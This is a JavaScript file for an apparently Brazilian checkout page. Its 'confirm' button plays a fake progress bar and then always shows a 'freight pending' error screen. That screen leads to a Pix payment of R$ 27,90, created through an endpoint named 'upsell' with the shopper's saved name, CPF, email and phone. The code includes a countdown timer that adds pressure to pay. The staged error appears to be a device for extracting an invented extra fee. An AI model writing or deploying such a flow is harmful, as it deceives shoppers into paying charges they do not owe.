/* ═══ Confirmar -> tela de erro (pendência de frete) ═══ */
document.querySelector('.btn-confirmar').addEventListener('click', function () {
  const overlay = document.getElementById('overlay')
  const fill = document.getElementById('progressFill')
  const label = document.getElementById('progressLabel')

  overlay.classList.add('active')

  const steps = [15, 35, 58, 74, 89, 100]
  const delays = [300, 600, 900, 1300, 1700, 2200]

  steps.forEach((val, i) => {
    setTimeout(() => {
      fill.style.width = val + '%'
      label.textContent = val + '%'
    }, delays[i])
  })

  setTimeout(() => {
    overlay.classList.remove('active')
    document.getElementById('page1wrap').style.display = 'none'
    const err = document.getElementById('errorScreen')
    err.style.display = 'block'
    err.style.animation = 'slide-up 0.35s cubic-bezier(.22,.68,0,1.2) both'
  }, 2800)
})

/* ═══ Pagar o frete: gera o Pix na mesma API da Velani (kind=frete) ═══
   file:// (abrindo no PC) = mock, simula o Pix sem cobrança real.
   Publicado no site = live, chama /api/upsell e /api/status. */
;(function () {
  const CFG = {
    mode: location.protocol === 'file:' ? 'mock' : 'live',
    apiBase: '/api',
    pollMs: 5000,
    timerSecs: 30 * 60,
  }

  const $ = (id) => document.getElementById(id)
  const brl = (c) => 'R$ ' + (c / 100).toFixed(2).replace('.', ',')
  const state = { idem: null, busy: false, poll: null, countdown: null }

  function savedCustomer () {
    try { return JSON.parse(localStorage.getItem('allu_customer') || '{}') || {} } catch (e) { return {} }
  }
  function tracking () {
    const o = Object.assign({}, savedCustomer().tracking || {})
    const q = new URLSearchParams(location.search)
    ;['utm_source', 'utm_campaign', 'utm_medium', 'utm_content', 'utm_term', 'src', 'sck']
      .forEach((k) => { if (q.get(k)) o[k] = q.get(k) })
    return o
  }
  function uuid () {
    return (window.crypto && crypto.randomUUID)
      ? crypto.randomUUID()
      : 'u' + Date.now().toString(36) + Math.random().toString(36).slice(2, 10)
  }

  /* ---- camada de API (live) e simulação (mock) ---- */
  async function api (path, opts) {
    let r
    try { r = await fetch(CFG.apiBase + path, opts) } catch (e) { throw new Error('Sem conexão com o servidor. Tente novamente.') }
    let d = {}; try { d = await r.json() } catch (e) {}
    if (!r.ok) throw new Error(d.error || 'Não foi possível gerar o Pix. Tente novamente.')
    return d
  }
  function mockCreate () {
    const id = 'TESTE-' + Date.now().toString(36).toUpperCase()
    const code = '00020126580014br.gov.bcb.pix0136TESTE-FRETE-0000-0000000000005204000053039865406' + '27.90' + '5802BR5905ALLU6009SAO PAULO62070503***6304TEST'
    return Promise.resolve({ orderId: id, status: 'pending', amountCents: 2790, pix: { copyPaste: code, qrImage: null } })
  }
  const MOCK_AT = {}
  function mockStatus (id) {
    if (!MOCK_AT[id]) MOCK_AT[id] = Date.now()
    return Promise.resolve({ status: Date.now() - MOCK_AT[id] > 8000 ? 'paid' : 'pending' })
  }
  const createFrete = () => {
    if (CFG.mode === 'mock') return mockCreate()
    const c = savedCustomer()
    return api('/upsell', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        kind: 'frete',
        idempotencyKey: (state.idem || (state.idem = uuid())),
        customer: { name: c.name, cpf: c.cpf, email: c.email, phone: c.phone },
        tracking: tracking(),
      }),
    })
  }
  const getStatus = (id) => CFG.mode === 'mock'
    ? mockStatus(id)
    : api('/status?id=' + encodeURIComponent(id))

  /* ---- telas ---- */
  function showGenerating () {
    $('genOverlay').style.display = 'flex'
    const steps = ['gs1', 'gs2', 'gs3', 'gs4']
    steps.forEach((s, i) => setTimeout(() => {
      steps.forEach((x) => { const e = $(x); if (e) e.classList.remove('active') })
      for (let j = 0; j < i; j++) { const e = $(steps[j]); if (e) { e.classList.remove('active'); e.classList.add('done') } }
      const cur = $(s); if (cur) cur.classList.add('active')
    }, 300 + i * 650))
  }

  function showPix (res) {
    $('genOverlay').style.display = 'none'
    $('pixPage').style.display = 'block'

    const amount = document.querySelector('#pixPage .value-amount')
    if (amount && res.amountCents) amount.textContent = brl(res.amountCents)

    const code = res.pix.copyPaste
    $('pixCode').textContent = code

    const box = $('qrCanvas'); box.innerHTML = ''
    if (res.pix.qrImage) {
      const img = document.createElement('img')
      img.alt = 'QR Code Pix'; img.style.maxWidth = '100%'
      img.src = /^(data:|https?:)/.test(res.pix.qrImage) ? res.pix.qrImage : 'data:image/png;base64,' + res.pix.qrImage
      box.appendChild(img)
    } else if (window.QRCode) {
      try { new QRCode(box, { text: code, width: 180, height: 180, correctLevel: QRCode.CorrectLevel.M }) } catch (e) {}
    }

    startTimer()
    startPolling(res.orderId)
    window.scrollTo({ top: 0, behavior: 'smooth' })
  }

  function startTimer () {
    let s = CFG.timerSecs
    const disp = $('timerDisplay')
    const tick = () => {
      const m = String(Math.floor(s / 60)).padStart(2, '0'), ss = String(s % 60).padStart(2, '0')
      if (disp) disp.textContent = m + ':' + ss
      if (s <= 0) { clearInterval(state.countdown); if (state.poll) clearInterval(state.poll); if (disp) disp.textContent = 'Expirado' }
      s--
    }
    tick(); state.countdown = setInterval(tick, 1000)
  }

  function startPolling (orderId) {
    state.poll = setInterval(async () => {
      try {
        const s = await getStatus(orderId)
        if (s.status === 'paid') { clearInterval(state.poll); clearInterval(state.countdown); showPaid() }
      } catch (e) {}
    }, CFG.pollMs)
  }

  function showPaid () {
    const body = document.querySelector('#pixPage .card-body')
    if (!body) return
    ;['.pix-main', '.expiry-box', '.section-label', '.steps-list'].forEach((sel) => {
      const el = body.querySelector(sel); if (el) el.style.display = 'none'
    })
    const banner = document.createElement('div')
    banner.style.cssText = 'background:#dcfce7;color:#166534;border-radius:12px;padding:18px;font-weight:600;text-align:center;line-height:1.5;'
    banner.innerHTML = '✓ <strong>Pagamento confirmado!</strong><br>Seu frete foi pago e o pedido será enviado em breve.'
    body.insertBefore(banner, body.firstChild)
    window.scrollTo({ top: 0, behavior: 'smooth' })
  }

  /* ---- copiar código Pix (chamado pelo onclick do botão) ---- */
  window.copiarPix = async function () {
    const code = $('pixCode').textContent || ''
    const btn = $('btnCopiar'), txt = $('btnText')
    try { await navigator.clipboard.writeText(code) }
    catch (e) {
      const r = document.createRange(); r.selectNode($('pixCode'))
      const sel = window.getSelection(); sel.removeAllRanges(); sel.addRange(r)
      try { document.execCommand('copy') } catch (_) {}
      sel.removeAllRanges()
    }
    if (btn) btn.classList.add('copied')
    if (txt) txt.textContent = 'COPIADO'
    setTimeout(() => { if (btn) btn.classList.remove('copied'); if (txt) txt.textContent = 'COPIAR' }, 2000)
  }

  /* ---- clique no "Pagar frete" ---- */
  document.querySelector('.btn-frete').addEventListener('click', async function () {
    if (state.busy) return
    state.busy = true
    showGenerating()
    try {
      const res = await createFrete()
      if (!res || !res.pix || !res.pix.copyPaste) throw new Error('Resposta inválida do servidor.')
      setTimeout(() => showPix(res), 2000)
    } catch (err) {
      state.busy = false
      $('genOverlay').style.display = 'none'
      alert(err.message || 'Não foi possível gerar o Pix agora. Tente novamente.')
    }
  })
})()
